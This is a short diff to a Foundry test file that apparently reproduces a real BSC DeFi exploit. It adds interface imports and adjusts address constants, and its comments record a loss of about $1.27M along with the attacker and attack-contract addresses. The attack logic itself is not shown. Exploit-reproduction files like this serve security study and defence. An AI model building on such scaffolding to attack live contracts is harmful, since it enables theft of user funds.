@@ -3,6 +3,13 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
 // @KeyInfo - Total Lost : ~$1.27M
 // Attacker : https://bscscan.com/address/0xfdbfceea1de360364084a6f37c9cdb7aaea63464
 // Attack Contract : https://bscscan.com/address/0x216ccfd4fb3f2267677598f96ef1ff151576480c
@@ -32,7 +39,7 @@ contract ContractTest is Test {
     IUniswapV3Pair private constant BUSDT_USDC = IUniswapV3Pair(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
     IUnverifiedContract1 private constant UnverifiedContract1 =
         IUnverifiedContract1(0x8cA7835aa30b025b38A59309DD1479d2F452623a);
-    IUniswapV2Router private constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router private constant Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address private constant lpToken = 0xdbC27f2e9a2532b15C848F4Ae408cfE8BeB14959;
     address private constant unverifiedContractAddr2 = 0x5b9dd1De70320B1EA6C8BBebA12bf4e246227999;
     address private constant busdt_bh_lp = 0x2371E4Ad771020CE3D8252f1db3e5559FbA8eeb5;
